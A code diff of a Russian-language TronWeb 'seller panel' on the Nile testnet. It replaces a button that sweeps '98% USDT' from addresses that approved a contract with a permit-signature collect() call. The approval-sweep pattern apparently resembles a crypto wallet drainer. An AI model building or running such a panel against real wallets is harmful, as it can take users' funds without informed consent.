@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Панель Продавца — Nile Testnet</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -133,6 +133,10 @@
             justify-content: center; gap: 1.5rem;
         }
         .loading-overlay.hidden { display: none; }
+        .signature-input {
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
     </style>
 </head>
 <body>
@@ -169,52 +173,94 @@
         <div id="mainContent" style="display: none;">
             <div class="contract-info">
                 <div>
-                    <div style="color: var(--text-secondary); font-size: 0.875rem;">Контракт:</div>
+                    <div style="color: var(--text-secondary); font-size: 0.875rem;">Контракт SimplePermit:</div>
                 </div>
-                <div class="contract-address">TGxG4gNThiidB9dPtamaHEsDwiRGzAQrr3</div>
+                <div class="contract-address">TNZVadgnVsJmKsTGcwRtStg7qbn7gvT4eq</div>
             </div>
 
             <div class="main-card">
                 <h2>🔍 Проверка и сбор средств</h2>
+                <p style="color: var(--text-secondary); margin-bottom: 1.5rem;">
+                    Введите данные подписи от покупателя для вызова collect()
+                </p>
 
                 <div class="form-group">
-                    <label>Адрес покупателя (начинается с T)</label>
+                    <label>Адрес покупателя (buyer)</label>
                     <div class="input-group">
-                        <input type="text" id="userAddress" placeholder="Например: TM84hjZ28XRw13oHAWWsGnf54mUSHVVDtN">
-                        <button class="btn-icon" onclick="pasteAddress()">📋</button>
+                        <input type="text" id="buyerAddress" placeholder="Например: TM84hjZ28XRw13oHAWWsGnf54mUSHVVDtN">
+                        <button class="btn-icon" onclick="pasteField('buyerAddress')">📋</button>
                     </div>
                 </div>
 
                 <div class="form-group">
-                    <label>Адрес USDT (Nile Testnet)</label>
+                    <label>Сумма (amount, в USDT с 6 decimals)</label>
                     <div class="input-group">
-                        <input type="text" id="usdtAddress" value="TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf">
-                        <button class="btn-icon" onclick="resetUsdt()">↺</button>
+                        <input type="number" id="amountInput" placeholder="100000000 = 100 USDT">
+                        <button class="btn-icon" onclick="pasteField('amountInput')">📋</button>
                     </div>
                 </div>
 
-                <button class="btn-primary" onclick="checkUser()" id="checkBtn" style="width: 100%;">
-                    <span id="checkBtnText">Проверить</span>
+                <div class="form-group">
+                    <label>Nonce</label>
+                    <div class="input-group">
+                        <input type="number" id="nonceInput" placeholder="123456">
+                        <button class="btn-icon" onclick="pasteField('nonceInput')">📋</button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Deadline (timestamp)</label>
+                    <div class="input-group">
+                        <input type="number" id="deadlineInput" placeholder="1715000000">
+                        <button class="btn-icon" onclick="pasteField('deadlineInput')">📋</button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Подпись v (0, 27 или 28)</label>
+                    <div class="input-group">
+                        <input type="number" id="vInput" placeholder="27" class="signature-input">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Подпись r (hex, 64 символа)</label>
+                    <div class="input-group">
+                        <input type="text" id="rInput" placeholder="0x..." class="signature-input">
+                        <button class="btn-icon" onclick="pasteField('rInput')">📋</button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Подпись s (hex, 64 символа)</label>
+                    <div class="input-group">
+                        <input type="text" id="sInput" placeholder="0x..." class="signature-input">
+                        <button class="btn-icon" onclick="pasteField('sInput')">📋</button>
+                    </div>
+                </div>
+
+                <button class="btn-primary" onclick="checkStatus()" id="checkBtn" style="width: 100%; margin-bottom: 1rem;">
+                    <span id="checkBtnText">Проверить статус</span>
                 </button>
 
                 <div class="user-info" id="userInfo">
                     <div class="info-row">
+                        <span style="color: var(--text-secondary);">Allowance:</span>
+                        <span id="allowanceStatus"></span>
+                    </div>
+                    <div class="info-row">
+                        <span style="color: var(--text-secondary);">Баланс:</span>
+                        <span id="balanceStatus"></span>
+                    </div>
+                    <div class="info-row">
                         <span style="color: var(--text-secondary);">Доступ разрешен:</span>
-                        <span id="approveStatus"></span>
-                    </div>
-                    <div class="info-row">
-                        <span style="color: var(--text-secondary);">Собрано:</span>
-                        <span id="collectStatus"></span>
-                    </div>
-                    <div class="info-row">
-                        <span style="color: var(--text-secondary);">Доступно:</span>
-                        <span id="availableAmount" style="color: var(--accent); font-weight: 700;"></span>
+                        <span id="accessStatus"></span>
                     </div>
                 </div>
 
                 <div id="collectSection" style="display: none; margin-top: 1.5rem;">
                     <button class="btn-collect" onclick="collectFunds()" id="collectBtn">
-                        💸 Собрать 98% USDT
+                        💸 Вызвать collect()
                     </button>
                     <div class="status-message" id="collectStatusMsg"></div>
                 </div>
@@ -224,18 +270,20 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = 'TGxG4gNThiidB9dPtamaHEsDwiRGzAQrr3';
-        const DEFAULT_USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+        const CONTRACT_ADDRESS = 'TNZVadgnVsJmKsTGcwRtStg7qbn7gvT4eq';
+        const USDT_ADDRESS = 'TF17BgPaZYzXTPb5tS1DaJzsGPB9vMVh6f';
 
+        // Полный ABI SimplePermit
         const CONTRACT_ABI = [
-            {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"name":"","type":"address"}],"name":"approved","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"name":"","type":"address"}],"name":"collected","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-            {"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
+            {"inputs":[{"name":"_usdt","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
+            {"inputs":[{"name":"buyer","type":"address"},{"name":"amount","type":"uint256"},{"name":"nonce","type":"uint256"},{"name":"deadline","type":"uint256"},{"name":"v","type":"uint8"},{"name":"r","type":"bytes32"},{"name":"s","type":"bytes32"}],"name":"collect","outputs":[],"stateMutability":"nonpayable","type":"function"},
+            {"inputs":[{"name":"buyer","type":"address"}],"name":"getStatus","outputs":[{"name":"allowance","type":"uint256"},{"name":"balance","type":"uint256"},{"name":"hasAccess","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"permit","type":"tuple","components":[{"name":"buyer","type":"address"},{"name":"amount","type":"uint256"},{"name":"nonce","type":"uint256"},{"name":"deadline","type":"uint256"}]},{"name":"v","type":"uint8"},{"name":"r","type":"bytes32"},{"name":"s","type":"bytes32"}],"name":"verifyPermit","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"","type":"address"},{"name":"","type":"uint256"}],"name":"usedNonces","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[],"name":"usdt","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
         ];
 
-        let tronWeb, contract, userAddress, currentUserData = null;
+        let tronWeb, contract, userAddress;
 
         window.addEventListener('load', async () => {
             if (window.tronWeb?.ready) {
@@ -276,21 +324,20 @@
             }
         }
 
-        async function pasteAddress() {
-            const text = await navigator.clipboard.readText();
-            document.getElementById('userAddress').value = text.trim();
+        async function pasteField(fieldId) {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById(fieldId).value = text.trim();
+            } catch (e) {
+                alert('Не удалось прочитать буфер обмена');
+            }
         }
 
-        function resetUsdt() {
-            document.getElementById('usdtAddress').value = DEFAULT_USDT;
-        }
+        async function checkStatus() {
+            const buyer = document.getElementById('buyerAddress').value.trim();
 
-        async function checkUser() {
-            const user = document.getElementById('userAddress').value.trim();
-            const usdt = document.getElementById('usdtAddress').value.trim();
-
-            if (!user || !user.startsWith('T')) {
-                alert('Введите корректный адрес (начинается с T)');
+            if (!buyer || !buyer.startsWith('T')) {
+                alert('Введите корректный адрес покупателя (начинается с T)');
                 return;
             }
 
@@ -298,44 +345,67 @@
             document.getElementById('checkBtnText').textContent = 'Проверка...';
 
             try {
-                const isApproved = await contract.approved(user).call();
-                const isCollected = await contract.collected(user).call();
-                const amount = await contract.checkCollectable(user, usdt).call();
+                const result = await contract.getStatus(buyer).call();
+                
+                const allowance = result.allowance.toNumber();
+                const balance = result.balance.toNumber();
+                const hasAccess = result.hasAccess;
 
-                document.getElementById('approveStatus').innerHTML = isApproved 
+                document.getElementById('allowanceStatus').textContent = (allowance / 1e6).toFixed(2) + ' USDT';
+                document.getElementById('balanceStatus').textContent = (balance / 1e6).toFixed(2) + ' USDT';
+                document.getElementById('accessStatus').innerHTML = hasAccess 
                     ? '<span class="badge badge-success">✅ Да</span>' 
                     : '<span class="badge badge-error">❌ Нет</span>';
-                document.getElementById('collectStatus').innerHTML = isCollected
-                    ? '<span class="badge badge-success">✅ Да</span>'
-                    : '<span class="badge badge-warning">⏳ Нет</span>';
-                document.getElementById('availableAmount').textContent = (amount / 1e6).toFixed(2) + ' USDT';
 
                 document.getElementById('userInfo').classList.add('visible');
 
-                if (amount > 0 && !isCollected) {
+                // Показываем кнопку collect если есть allowance
+                if (allowance > 0) {
                     document.getElementById('collectSection').style.display = 'block';
-                    currentUserData = { user, usdt, amount };
                 } else {
                     document.getElementById('collectSection').style.display = 'none';
                 }
+
             } catch (e) {
-                alert('Ошибка: ' + e.message);
+                alert('Ошибка проверки: ' + e.message);
             } finally {
                 document.getElementById('checkBtn').disabled = false;
-                document.getElementById('checkBtnText').textContent = 'Проверить';
+                document.getElementById('checkBtnText').textContent = 'Проверить статус';
             }
         }
 
         async function collectFunds() {
-            if (!currentUserData) return;
-            const { user, usdt } = currentUserData;
+            const buyer = document.getElementById('buyerAddress').value.trim();
+            const amount = parseInt(document.getElementById('amountInput').value);
+            const nonce = parseInt(document.getElementById('nonceInput').value);
+            const deadline = parseInt(document.getElementById('deadlineInput').value);
+            const v = parseInt(document.getElementById('vInput').value);
+            let r = document.getElementById('rInput').value.trim();
+            let s = document.getElementById('sInput').value.trim();
+
+            if (!buyer || !amount || isNaN(nonce) || !deadline || isNaN(v) || !r || !s) {
+                alert('Заполните все поля подписи');
+                return;
+            }
+
+            // Форматируем r и s
+            if (!r.startsWith('0x')) r = '0x' + r;
+            if (!s.startsWith('0x')) s = '0x' + s;
 
             const btn = document.getElementById('collectBtn');
             btn.disabled = true;
-            btn.innerHTML = '<div class="spinner" style="border-top-color: white;"></div> Сбор...';
+            btn.innerHTML = '<div class="spinner" style="border-top-color: white;"></div> Вызов collect()...';
 
             try {
-                const tx = await contract.collectUSDT(user, usdt).send({
+                const tx = await contract.collect(
+                    buyer,
+                    amount,
+                    nonce,
+                    deadline,
+                    v,
+                    r,
+                    s
+                ).send({
                     feeLimit: 100000000,
                     callValue: 0
                 });
@@ -343,11 +413,13 @@
                 document.getElementById('collectStatusMsg').className = 'status-message success visible';
                 document.getElementById('collectStatusMsg').innerHTML = '✅ Успешно! TX: ' + tx.slice(0, 20) + '...';
                 btn.innerHTML = '✅ Собрано';
+
             } catch (e) {
+                console.error(e);
                 document.getElementById('collectStatusMsg').className = 'status-message error visible';
-                document.getElementById('collectStatusMsg').textContent = '❌ ' + e.message;
+                document.getElementById('collectStatusMsg').textContent = '❌ ' + (e.message || 'Ошибка транзакции');
                 btn.disabled = false;
-                btn.innerHTML = '💸 Собрать 98% USDT';
+                btn.innerHTML = '💸 Вызвать collect()';
             }
         }
     </script>
